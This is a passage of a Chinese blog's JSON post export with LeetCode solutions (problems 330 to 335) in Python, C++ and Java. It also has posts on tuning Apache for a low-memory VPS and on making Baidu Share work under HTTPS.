&amp;&amp; x[i]+x[i-4]&gt;=x[i-2]) return true; // Case 3: current line crosses the line 6 steps ahead of it else if(i&gt;=5 &amp;&amp; x[i-2]&gt;=x[i-4] &amp;&amp; x[i]+x[i-4]&gt;=x[i-2] &amp;&amp; x[i-1]&lt;=x[i-3] &amp;&amp; x[i-1]+x[i-5]&gt;=x[i-3]) return true; &#125; return false; &#125;/* i-2 case 1 : i-1┌─┐ └─┼─&gt;i i-3 i-2 case 2 : i-1 ┌────┐ └─══&gt;┘i-3 i i-4 (i overlapped i-4) case 3 : i-4 ┌──┐ │i&lt;┼─┐ i-3│ i-5│i-1 └────┘ i-2*/&#125;; 本题是leetcode 335 Self Crossing 题解， 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Increasing Triplet Subsequence","slug":"leetcode-increasing-triplet-subsequence","date":"2016-02-16T06:12:56.000Z","updated":"2021-01-08T13:32:16.850Z","comments":true,"path":"leetcode-increasing-triplet-subsequence/","link":"","permalink":"https://www.hrwhisper.me/leetcode-increasing-triplet-subsequence/","excerpt":"leetcode Increasing Triplet Subsequence Given an unsorted array return whether an increasing subsequence of length 3 exists or not in the array. Formally the function should: Return true if there exists i, j, k such that arr[i] &lt; arr[j] &lt; arr[k] given 0 ≤ i &lt; j &lt; k ≤ n-1 else return false.Your algorithm should run in O(n) time complexity and O(1) space complexity. Examples: Given [1, 2, 3, 4, 5], return true. Given [5, 4, 3, 2, 1], return false.","text":"leetcode Increasing Triplet Subsequence Given an unsorted array return whether an increasing subsequence of length 3 exists or not in the array. Formally the function should: Return true if there exists i, j, k such that arr[i] &lt; arr[j] &lt; arr[k] given 0 ≤ i &lt; j &lt; k ≤ n-1 else return false.Your algorithm should run in O(n) time complexity and O(1) space complexity. Examples: Given [1, 2, 3, 4, 5], return true. Given [5, 4, 3, 2, 1], return false. 题目地址: leetcode Increasing Triplet Subsequence 题意：给定一个长度为n的乱序的数组arr，让你求是否有i,j,k三个数，使得 arr[i] &lt; arr[j] &lt; arr[k] ( 0 ≤ i &lt; j &lt; k ≤ n-1) 思路： 设 x1为到目前为止的最小值 ， x2为到目前为止至少有一个数比x2小的最小的数。 初始时设置x1 = x2 = INT_MAX ，然后遍历数组,不断的更新x1和x2 具体如下 num &lt;= x1, 此时将x1设置为num 若 x1 &lt; num &lt;= x2，则 把x2 设置为num x2 &lt; num 说明有解，返回true即可 简单的说，上述的过程就是不断的缩小x1和x2，看看是否有第三个数 比x2大。 如果出现第三个数 num &gt; x2，则之前必定还有个数x 小于x2，就是说满足 x &lt; x2 &lt; num，就是说有答案啦。 Python 123456789101112131415class Solution(object): def increasingTriplet(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: bool &quot;&quot;&quot; x1 = x2 = 0x7fffffff for num in nums: if num &lt;= x1: x1 = num elif num &lt;= x2: # x1 &lt; num &lt;= x2 x2 = num else: # x &lt; x2 &lt; num , so it return true return True return False C++ 123456789101112class Solution &#123;public: bool increasingTriplet(vector&lt;int&gt;&amp; nums) &#123; int x1 = 0x7fffffff, x2 = 0x7fffffff; for(int num : nums)&#123; if(num &lt;= x1) x1 = num; else if(num &lt;=x2) x2 = num; else return true; &#125; return false; &#125;&#125;; Java 1234567891011public class Solution &#123; public boolean increasingTriplet(int[] nums) &#123; int x1 = 0x7fffffff, x2 = 0x7fffffff; for(int num : nums)&#123; if(num &lt;= x1) x1 = num; else if(num &lt;=x2) x2 = num; else return true; &#125; return false; &#125;&#125; 本题是leetcode 334 Increasing Triplet Subsequence题解， 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Reconstruct Itinerary","slug":"leetcode-reconstruct-itinerary","date":"2016-02-04T12:17:06.000Z","updated":"2021-01-08T13:32:16.861Z","comments":true,"path":"leetcode-reconstruct-itinerary/","link":"","permalink":"https://www.hrwhisper.me/leetcode-reconstruct-itinerary/","excerpt":"leetcode Reconstruct Itinerary Given a list of airline tickets represented by pairs of departure and arrival airports [from, to], reconstruct the itinerary in order. All of the tickets belong to a man who departs from JFK. Thus, the itinerary must begin with JFK. Note: If there are multiple valid itineraries, you should return the itinerary that has the smallest lexical order when read as a single string. For example, the itinerary [\"JFK\", \"LGA\"] has a smaller lexical order than [\"JFK\", \"LGB\"]. All airports are represented by three capital letters (IATA code). You may assume all tickets may form at least one valid itinerary. Example 1: tickets = [[\"MUC\", \"LHR\"], [\"JFK\", \"MUC\"], [\"SFO\", \"SJC\"], [\"LHR\", \"SFO\"]] Return [\"JFK\", \"MUC\", \"LHR\", \"SFO\", \"SJC\"]. Example 2: tickets = [[\"JFK\",\"SFO\"],[\"JFK\",\"ATL\"],[\"SFO\",\"ATL\"],[\"ATL\",\"JFK\"],[\"ATL\",\"SFO\"]] Return [\"JFK\",\"ATL\",\"JFK\",\"SFO\",\"ATL\",\"SFO\"]. Another possible reconstruction is [\"JFK\",\"SFO\",\"ATL\",\"JFK\",\"ATL\",\"SFO\"]. But it is larger in lexical order.","text":"leetcode Reconstruct Itinerary Given a list of airline tickets represented by pairs of departure and arrival airports [from, to], reconstruct the itinerary in order. All of the tickets belong to a man who departs from JFK. Thus, the itinerary must begin with JFK. Note: If there are multiple valid itineraries, you should return the itinerary that has the smallest lexical order when read as a single string. For example, the itinerary [\"JFK\", \"LGA\"] has a smaller lexical order than [\"JFK\", \"LGB\"]. All airports are represented by three capital letters (IATA code). You may assume all tickets may form at least one valid itinerary. Example 1: tickets = [[\"MUC\", \"LHR\"], [\"JFK\", \"MUC\"], [\"SFO\", \"SJC\"], [\"LHR\", \"SFO\"]] Return [\"JFK\", \"MUC\", \"LHR\", \"SFO\", \"SJC\"]. Example 2: tickets = [[\"JFK\",\"SFO\"],[\"JFK\",\"ATL\"],[\"SFO\",\"ATL\"],[\"ATL\",\"JFK\"],[\"ATL\",\"SFO\"]] Return [\"JFK\",\"ATL\",\"JFK\",\"SFO\",\"ATL\",\"SFO\"]. Another possible reconstruction is [\"JFK\",\"SFO\",\"ATL\",\"JFK\",\"ATL\",\"SFO\"]. But it is larger in lexical order. 题目地址： leetcode Reconstruct Itinerary 题意：给定一些飞机票，让你从中找出一个序列可以全部用完。要求如下 从JFK出发。 如果有多个解，输出字典序最小的。 思路： 这题其实很水，只要你这些数据结构掌握的好的话。 返回的答案必为n+1，n为tickets的个数 一张飞机票只能用一次，所以要计数。（可能重复） 字典序最小只需要保证我们遍历的时候从小到大遍历即可。so，建图的时候邻接表边从小到大。 所以C++用map, Python 排序后OrderedDict. 以上所有的情况都考虑到了，然而没有1A我很惭愧。。。因为一时激动把DFS最后的return false 写成true了。。。 再ps: 题目其实可以增加难度的，比如，有的飞机票就是用不到啊[a,b ] [b,c] [f,g]最后一张用不到，让你求最多跑多少，多解输出最小序列。怎么实现就留给读者吧:) C++ 12345678910111213141516171819202122232425262728class Solution &#123;public: vector&lt;string&gt; findItinerary(vector&lt;pair&lt;string, string&gt;&gt; tickets) &#123; unordered_map&lt;string, map&lt;string,int&gt;&gt; m; for (const auto &amp;p : tickets) &#123; m[p.first][p.second]++; &#125; string start = &quot;JFK&quot;; vector&lt;string&gt; ans; ans.push_back(start); dfs(start, ans, tickets.size()+ 1, m); return ans; &#125; bool dfs(const string &amp; cur,vector&lt;string&gt; &amp;ans,const int &amp;n,unordered_map&lt;string, map&lt;string, int&gt;&gt; &amp;m) &#123; if (ans.size() == n) return true; for (auto ticket = m[cur].begin(); ticket != m[cur].end(); ticket++) &#123; //map&lt;string, int&gt;::iterator if (ticket-&gt;second != 0) &#123; ticket-&gt;second--; ans.push_back(ticket-&gt;first); if (dfs(ticket-&gt;first, ans, n, m)) return true; ans.pop_back(); ticket-&gt;second++; &#125; &#125; return false; &#125;&#125;; Python 1234567891011121314151617181920212223class Solution(object): def findItinerary(self, tickets): &quot;&quot;&quot; :type tickets: List[List[str]] :rtype: List[str] &quot;&quot;&quot; n, self.ans = len(tickets) + 1, [&#x27;JFK&#x27;] m = collections.defaultdict(lambda :collections.OrderedDict()) for x, y in sorted(tickets): m[x].setdefault(y,0) m[x][y] += 1 self.dfs(&#x27;JFK&#x27;, n,m) return self.ans def dfs(self,cur,n,m): if len(self.ans) == n: return True if cur in m: for y,cnt in m[cur].items(): if cnt != 0: m[cur][y], self.ans = m[cur][y] - 1, self.ans + [y] if self.dfs(y,n,m): return True m[cur][y], self.ans = m[cur][y] + 1, self.ans[:-1] return False 本题是leetcode 332 Reconstruct Itinerary 题解， 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Verify Preorder Serialization of a Binary Tree","slug":"leetcode-verify-preorder-serialization-of-a-binary-tree","date":"2016-02-01T07:53:30.000Z","updated":"2021-01-08T13:32:16.886Z","comments":true,"path":"leetcode-verify-preorder-serialization-of-a-binary-tree/","link":"","permalink":"https://www.hrwhisper.me/leetcode-verify-preorder-serialization-of-a-binary-tree/","excerpt":"leetcode Verify Preorder Serialization of a Binary Tree One way to serialize a binary tree is to use pre-order traversal. When we encounter a non-null node, we record the node's value. If it is a null node, we record using a sentinel value such as #. 12345678 _9_ &#x2F; \\ 3 2 &#x2F; \\ &#x2F; \\ 4 1 # 6&#x2F; \\ &#x2F; \\ &#x2F; \\# # # # # # For example, the above binary tree can be serialized to the string \"9,3,4,#,#,1,#,#,2,#,6,#,#\", where # represents a null node. Given a string of comma separated values, verify whether it is a correct preorder traversal serialization of a binary tree. Find an algorithm without reconstructing the tree. Each comma separated value in the string must be either an integer or a character '#' representing null pointer. You may assume that the input format is always valid, for example it could never contain two consecutive commas such as \"1,,3\".","text":"leetcode Verify Preorder Serialization of a Binary Tree One way to serialize a binary tree is to use pre-order traversal. When we encounter a non-null node, we record the node's value. If it is a null node, we record using a sentinel value such as #. 12345678 _9_ &#x2F; \\ 3 2 &#x2F; \\ &#x2F; \\ 4 1 # 6&#x2F; \\ &#x2F; \\ &#x2F; \\# # # # # # For example, the above binary tree can be serialized to the string \"9,3,4,#,#,1,#,#,2,#,6,#,#\", where # represents a null node. Given a string of comma separated values, verify whether it is a correct preorder traversal serialization of a binary tree. Find an algorithm without reconstructing the tree. Each comma separated value in the string must be either an integer or a character '#' representing null pointer. You may assume that the input format is always valid, for example it could never contain two consecutive commas such as \"1,,3\". Example 1: \"9,3,4,#,#,1,#,#,2,#,6,#,#\" Return true Example 2: \"1,#\" Return false Example 3: \"9,#,#,1\" Return false 题目地址：leetcode Verify Preorder Serialization of a Binary Tree 题意：给定二叉树的前序遍历，要你在不构造树的情况下，判断树是否合法。 其实是一道google电面的题，之前在一亩三分地看过。 思路： 栈 入度和出度的差 栈 这个方法简单的说就是不断的砍掉叶子节点。最后看看能不能全部砍掉。 已例子一为例，：\"9,3,4,#,#,1,#,#,2,#,6,#,#\" 遇到x # #的时候，就把它变为 # 我模拟一遍过程： 9,3,4,#,# =&gt; 9,3,# 继续读 9,3,#,1,#,# =&gt; 9,3,#,# =&gt; 9,# 继续读 9,#2,#,6,#,# =&gt; 9,#,2,#,# =&gt; 9,#,# =&gt; # 合法的情况最后一定是一个#，python代码如下: Python 123456789101112class Solution(object): def isValidSerialization(self, preorder): &quot;&quot;&quot; :type preorder: str :rtype: bool &quot;&quot;&quot; stack = [] for x in preorder.split(&#x27;,&#x27;): stack += [x] while len(stack) &gt;= 3 and stack[-2:] == [&#x27;#&#x27;,&#x27;#&#x27;] and stack[-3]!=&#x27;#&#x27;: stack = stack[:-3] +[&#x27;#&#x27;] # pop *3 and append # return len(stack) == 1 and stack[0] == &#x27;#&#x27; 入度和出度的差 看了 dietpepsi 的代码，确实思路比我上面的更胜一筹： In a binary tree, if we consider null as leaves, then all non-null node provides 2 outdegree and 1 indegree (2 children and 1 parent), except root all null node provides 0 outdegree and 1 indegree (0 child and 1 parent). Suppose we try to build this tree. During building, we record the difference between out degree and in degree diff = outdegree - indegree. When the next node comes, we then decrease diff by 1, because the node provides an in degree. If the node is not null, we increase diff by2, because it provides two out degrees. If a serialization is correct, diff should never be negative and diff will be zero when finished. from :https://leetcode.com/discuss/83824/7-lines-easy-java-solution 我这里翻译一下： 对于二叉树，我们把空的地方也作为叶子节点（如题目中的#），那么有 所有的非空节点提供2个出度和1个入度（根除外） 所有的空节点但提供0个出度和1个入度 我们在遍历的时候，计算diff = outdegree - indegree. 当一个节点出现的时候，diff - 1，因为它提供一个入度；当节点不是#的时候，diff+2(提供两个出度) 如果序列式合法的，那么遍历过程中diff &gt;=0 且最后结果为0. Java 123456789public boolean isValidSerialization(String preorder) &#123; String[] nodes = preorder.split(&quot;,&quot;); int diff = 1; for (String node: nodes) &#123; if (--diff &lt; 0) return false; if (!node.equals(&quot;#&quot;)) diff += 2; &#125; return diff == 0;&#125; 本文是leetcode 331 Verify Preorder Serialization of a Binary Tree 的题解， 更多题解见：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Patching Array","slug":"leetcode-patching-array","date":"2016-01-27T06:55:05.000Z","updated":"2021-01-08T13:32:16.857Z","comments":true,"path":"leetcode-patching-array/","link":"","permalink":"https://www.hrwhisper.me/leetcode-patching-array/","excerpt":"leetcode Patching Array Given a sorted positive integer array nums and an integer n, add/patch elements to the array such that any number in range [1, n] inclusive can be formed by the sum of some elements in the array. Return the minimum number of patches required. Example 1: nums = [1, 3], n = 6 Return 1. Combinations of nums are [1], [3], [1,3], which form possible sums of: 1, 3, 4. Now if we add/patch 2 to nums, the combinations are: [1], [2], [3], [1,3], [2,3], [1,2,3]. Possible sums are 1, 2, 3, 4, 5, 6, which now covers the range [1, 6]. So we only need 1 patch.","text":"leetcode Patching Array Given a sorted positive integer array nums and an integer n, add/patch elements to the array such that any number in range [1, n] inclusive can be formed by the sum of some elements in the array. Return the minimum number of patches required. Example 1: nums = [1, 3], n = 6 Return 1. Combinations of nums are [1], [3], [1,3], which form possible sums of: 1, 3, 4. Now if we add/patch 2 to nums, the combinations are: [1], [2], [3], [1,3], [2,3], [1,2,3]. Possible sums are 1, 2, 3, 4, 5, 6, which now covers the range [1, 6]. So we only need 1 patch. Example 2: nums = [1, 5, 10], n = 20 Return 2. The two patches can be [2, 4]. Example 3: nums = [1, 2, 2], n = 5 Return 0. 题目地址：leetcode Patching Array 题意：给定一个数组nums和一个数n，求添加最少的数使得[1,n]中的每个数都可以由数组中元素和组成 思路： 一开始开了个数组标志已经可以被组合的数，然后从小到大看，哪个还不能被表示的就添加进去，然后更新（加上其他能被组合的数），然后RE了，看了下数据，2147483647， = = 这么大的数组。。不爆才怪。 然后参考了discuss的思路：https://leetcode.com/discuss/82822/solution-explanation 就是用known_sum表示已知的连续和为[1,known_sum)，有了这个表示那就简单了： nums[i] &lt;= known_sum，更新已知范围为：[1,known_sum + nums[i] ) nums[i] &gt; known_sum, 添加known_sum进数组才能达到最大的范围，所以已知范围更新为：[1,known_sum *2 ) C++ 8ms 12345678910111213141516class Solution &#123;public: int minPatches(vector&lt;int&gt;&amp; nums, int n) &#123; int cnt = 0, i = 0; for (long known_sum = 1; known_sum &lt;= n;) &#123; if (i &lt; nums.size() &amp;&amp; nums[i] &lt;= known_sum) &#123; known_sum += nums[i++]; &#125; else &#123; known_sum &lt;&lt;= 1; cnt++; &#125; &#125; return cnt; &#125;&#125;; Java 1ms 1234567891011121314public class Solution &#123; public int minPatches(int[] nums, int n) &#123; int cnt = 0,i=0; for(long known_sum = 1;known_sum &lt;= n;)&#123; if(i &lt; nums.length &amp;&amp; known_sum &gt;= nums[i])&#123; known_sum += nums[i++]; &#125;else&#123; known_sum &lt;&lt;= 1; cnt++; &#125; &#125; return cnt; &#125;&#125; Python 1234567891011121314151617class Solution(object): def minPatches(self, nums, n): &quot;&quot;&quot; :type nums: List[int] :type n: int :rtype: int &quot;&quot;&quot; i = cnt = 0 known_sum = 1 while known_sum &lt;= n: if i &lt; len(nums) and nums[i] &lt;= known_sum: known_sum += nums[i] i += 1 else: known_sum &lt;&lt;= 1 cnt += 1 return cnt 本文是leetcode 330 Patching Array 的题解，更多题解可见 https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"apache 在低配置服务器下的优化","slug":"optimizing-apache-for-low-memory-ram-vps","date":"2016-01-25T02:57:36.000Z","updated":"2020-10-19T14:35:48.812Z","comments":true,"path":"optimizing-apache-for-low-memory-ram-vps/","link":"","permalink":"https://www.hrwhisper.me/optimizing-apache-for-low-memory-ram-vps/","excerpt":"博主大清早在被窝里看看手机，浏览下博客，发现 Error establishing a database connection，显然是数据库挂了= = 貌似就是作死直接LAMP的下场（linux + apache +mysql + php） 博主立刻从床上弹起来，开电脑，重起mysql，就又可以了。 那么，虽然博主最近起不来→_→今天因为这个立马爬起来，但是总不能老是出错吧！ 于是开启了优化方案。。发现是由于apache内存占用太高导致mysql没内存用了","text":"博主大清早在被窝里看看手机，浏览下博客，发现 Error establishing a database connection，显然是数据库挂了= = 貌似就是作死直接LAMP的下场（linux + apache +mysql + php） 博主立刻从床上弹起来，开电脑，重起mysql，就又可以了。 那么，虽然博主最近起不来→_→今天因为这个立马爬起来，但是总不能老是出错吧！ 于是开启了优化方案。。发现是由于apache内存占用太高导致mysql没内存用了 由于囊中羞涩，之前买的是512MB的digitalocean (配置 512MB RAM/1 CPU ) 之前重启了下mysql，过了一会儿用top监视一下资源使用： 这么快又剩下57MB内存了!（58664K / 1024 =57MB） 必须要采取apche优化措施！ 你可以先用下面的命令看看内存占用情况和进程内存占用排行： free -m ps -eo pmem,pcpu,rss,vsize,args sort -k 1 -r less apache优化 查看Httpd工作模式 apachectl -l 博主工作在prefork模式下 apache-word-on-prefork 于是打开 httpd.conf ，查看配置（vim /etc/httpd/conf/httpd.conf） apache-prefork-configuration 这几个参数意思如下： StartServers 8 启动时默认启动的进程数 MinSpareServers 5 MinSpareServers指令设置空闲子进程的最小数量。所谓空闲子进程是指没有正在处理请求的子进程。如果当前空闲子进程数少于MinSpareServers ，那么Apache将以第一秒一个，第二秒两个，第三秒四个，按指数递增个数的速度产生新的子进程（最大32个/秒）。 MaxSpareServers 10 MaxSpareServers指令设置空闲子进程的最大数量。所谓空闲子进程是指没有正在处理请求的子进程。如果当前有超过MaxSpareServers数量的空闲子进程，那么父进程将杀死多余的子进程。 ServerLimit 256 配置的apache最大的并发响应数，对应的是apache的进程数 MaxClients 256 设定Apache可同时处理的请求数量 MaxClients不得大于ServerLimit参数。 MaxRequestsPerChild 4000 每个子进程理多少个请求后将自动销毁。到达MaxRequestsPerChild的限制后，子进程将会结束。如果MaxRequestsPerChild为\"0\"，子进程将永远不会结束 于是我们修改为： StartServers 1 MinSpareServers 1 MaxSpareServers 5 ServerLimit 10 MaxClients 10 修改后，重启下apache即可 service httpd restart 优化后 优化后： 稳定在200MB以上 optimizing-apache-for-low-memory-ram-vps-top-apache-use-optimized 博主暂时先这么优化，观察一阵子，再考虑是否进一步优化 参考资料 这个资料还有mysql优化，apache去除多于模块等： Configuring Apache/PHP/MySQL for Low Memory (RAM) VPS http://51write.github.io/2014/04/10/apache-optimal/","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"建站经验","slug":"others/建站经验","permalink":"https://www.hrwhisper.me/categories/others/%E5%BB%BA%E7%AB%99%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"wordpress","slug":"wordpress","permalink":"https://www.hrwhisper.me/tags/wordpress/"},{"name":"Centos","slug":"Centos","permalink":"https://www.hrwhisper.me/tags/Centos/"},{"name":"Linux","slug":"Linux","permalink":"https://www.hrwhisper.me/tags/Linux/"}]},{"title":"百度分享不支持https的解决方案","slug":"baidu-share-not-support-https-solution","date":"2016-01-22T14:55:10.000Z","updated":"2021-01-08T13:42:14.025Z","comments":true,"path":"baidu-share-not-support-https-solution/","link":"","permalink":"https://www.hrwhisper.me/baidu-share-not-support-https-solution/","excerpt":"站点自从开启 https 之后 ，百度分享就不能用了！但是又寻找不到类似百度分享的替代品。。 怎么办呢？要如何解决 百度分享不支持https的问题呢， 跟着博主动动手，让你百度分享仍然能在https下使用 ~","text":"站点自从开启 https 之后 ，百度分享就不能用了！但是又寻找不到类似百度分享的替代品。。 怎么办呢？要如何解决 百度分享不支持https的问题呢， 跟着博主动动手，让你百度分享仍然能在https下使用 ~ 伸手党 先上伸手党的解决方案~ 博主修改好的分享代码(下面两个链接下载其中一个)的即可 Github地址（推荐，2016.10.2更新）：https://github.com/hrwhisper/baiduShare PS: 求点star！鼓励一下博主！ 旧版本，不再更新。 备用地址： http://pan.baidu.com/s/1i4c1hnn 密码：0kjw 下载 下载方式如下： github download method 使用方法 static 解压后丢到站点的根目录 这里需要确保要确保“根目录”能被访问到，比如我的wordpress确实就是丢到根目录即可 其它的比如hexo其实时放在public目录下，如果不行可以在配置文件中添加如下内容，禁止hexo编译static文件夹 skip_render: – static/** 然后对应的百度分享代码中，把http://bdimg.share.baidu.com/改为 / 123.src=&#x27;http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=&#x27;+~(-new Date()/36e5)];&lt;/script&gt;改为.src=&#x27;/static/api/js/share.js?v=89860593.js?&#x27;];&lt;/script&gt; 比如说博主调用的百度分享代码如下： 12&lt;div class=&quot;bdsharebuttonbox&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;bds_more&quot; data-cmd=&quot;more&quot;&gt;&lt;/a&gt;&lt;a href=&quot;#&quot; class=&quot;bds_fbook&quot; data-cmd=&quot;fbook&quot; title=&quot;分享到Facebook&quot;&gt;&lt;/a&gt;&lt;a href=&quot;#&quot; class=&quot;bds_twi&quot; data-cmd=&quot;twi&quot; title=&quot;分享到Twitter&quot;&gt;&lt;/a&gt;&lt;a href=&quot;#&quot; class=&quot;bds_linkedin&quot; data-cmd=&quot;linkedin&quot; title=&quot;分享到linkedin&quot;&gt;&lt;/a&gt;&lt;a href=&quot;#&quot; class=&quot;bds_qzone&quot; data-cmd=&quot;qzone&quot; title=&quot;分享到QQ空间&quot;&gt;&lt;/a&gt;&lt;a href=&quot;#&quot; class=&quot;bds_tsina&quot; data-cmd=&quot;tsina&quot; title=&quot;分享到新浪微博&quot;&gt;&lt;/a&gt;&lt;a href=&quot;#&quot; class=&quot;bds_douban&quot; data-cmd=&quot;douban&quot; title=&quot;分享到豆瓣网&quot;&gt;&lt;/a&gt;&lt;a href=&quot;#&quot; class=&quot;bds_weixin&quot; data-cmd=&quot;weixin&quot; title=&quot;分享到微信&quot;&gt;&lt;/a&gt;&lt;a href=&quot;#&quot; class=&quot;bds_evernotecn&quot; data-cmd=&quot;evernotecn&quot; title=&quot;分享到印象笔记&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;script&gt;window._bd_share_config=&#123;&quot;common&quot;:&#123;&quot;bdSnsKey&quot;:&#123;&#125;,&quot;bdText&quot;:&quot;&quot;,&quot;bdMini&quot;:&quot;2&quot;,&quot;bdMiniList&quot;:false,&quot;bdPic&quot;:&quot;&quot;,&quot;bdStyle&quot;:&quot;1&quot;,&quot;bdSize&quot;:&quot;24&quot;&#125;,&quot;share&quot;:&#123;&#125;,&quot;image&quot;:&#123;&quot;viewList&quot;:[&quot;fbook&quot;,&quot;twi&quot;,&quot;linkedin&quot;,&quot;qzone&quot;,&quot;tsina&quot;,&quot;douban&quot;,&quot;weixin&quot;,&quot;evernotecn&quot;],&quot;viewText&quot;:&quot;分享到：&quot;,&quot;viewSize&quot;:&quot;16&quot;&#125;&#125;;with(document)0[(getElementsByTagName(&#x27;head&#x27;)[0]body).appendChild(createElement(&#x27;script&#x27;)).src=&#x27;/static/api/js/share.js?v=89860593.js?&#x27;];&lt;/script&gt; 自己动手，丰衣足食 所谓授人以鱼不如授人以渔，博主把主要的修复过程记录如下: 获取百度分享的文件 你可以直接用chrome - F12 - source 查看有什么文件，然后保存（注意微信的需要先点一下，对应的 css 才会出来） baidu-share-download 也可以直接看博主分享的文件，对应着下载。 把域名改成http://bdimg.share.baidu.com/加上对应的路径即可 修改一些文件 直接这么丢上去是会有问题的，你地址栏绿色的小锁会消失 T^T 就是说你虽然是Https的站点，但请求了http的资源，这种混合模式是不好滴 修复方法： static.js domain: &#123;staticUrl: \"http://bdimg.share.baidu.com/\"&#125;修改为 domain: &#123;staticUrl: \"/\"&#125; nsClick: \"http://nsclick.baidu.com/v.gif\" 修改为 nsClick: \"/\" static\\api\\js\\trans\\logger.js 把里面的内容都删掉，但保留这个空文件 貌似就是这两个步骤，博主应该没漏掉 修改印象笔记图标 博主用的是主题1（明显比主题0好看啊，主题0还没印象笔记图标）， 但是由于下面那个更多用的是主题0的图片，会造成加载两个图片，让我微微不爽（同样的没有印象笔记图标！） 于是修改如下： static\\api\\css\\share_popup.css 最后加上.popup_evernotecn&#123;background-position:4px -3190px;&#125; static\\api\\css\\share_style0_16.css 最后加上 .bds_evernotecn&#123;background-position:0 -3195px&#125; 把 icons_1_16.png 重命名为 icons_0_16.png 可选：用tinypng 把图片压缩下，博主现在这个图片就7.81KB 微信URL过长失败二维码出不来的问题 原因：网址过长时调用dwz API，而该网站不支持HTTPS 修复方式有两种 允许长的网址 自己寻找可以缩短网址的API，进行替换 本文采用的是第一种，在trans_weixin.js 修改d函数即可 12345678d = function () &#123; s.attr(&quot;data-url&quot;) != r &amp;&amp; (u.html(&quot;\\u6b63\\u5728\\u52a0\\u8f7d&quot;), r.length &gt; 200 ? /*p(r, function (e) &#123; h(e, !0) &#125;) */ h(r): h(r))&#125;, 写在最后 OK，快去试试效果吧~ 如果有不清楚的地方，欢迎留言。 你也可以对着我修改的结果查看~ 有用的话注册个github 给博主点个star 鼓励一下博主吧 ^ ^ 或者对博主进行打赏~","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"问题解决","slug":"others/问题解决","permalink":"https://www.hrwhisper.me/categories/others/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.hrwhisper.me/tags/HTTPS/"},{"name":"Javascript","slug":"Javascript","permalink":"https://www.hrwhisper.me/tags/Javascript/"},{"name":"wordpress","slug":"wordpress","permalink":"https://www.hrwhisper.me/tags/wordpress/"}]},{"title":"wordpress 博客全站开启https","slug":"secure-your-wordpress-with-a-free-ssl-certificate","date":"2016-01-21T09:06:52.000Z","updated":"2020-10-19T14:35:48.827Z","comments":true,"path":"secure-your-wordpress-with-a-free-ssl-certificate/","link":"","permalink":"https://www.hrwhisper.me/secure-your-wordpress-with-a-free-ssl-certificate/","excerpt":"本博客从17号开启全站https以来，观察几天，感觉不错。 本文介绍博主Https配置过程 包括如下内容 免费证书获取 apache ssl配置 开启ssl后需要注意的事项","text":"本博客从17号开启全站https以来，观察几天，感觉不错。 本文介绍博主Https配置过程 包括如下内容 免费证书获取 apache ssl配置 开启ssl后需要注意的事项 ps: 本文是apache下的开启方式，若用nginx，见 LNMP站点配置指南 https优缺点 https采用SSL（Secure 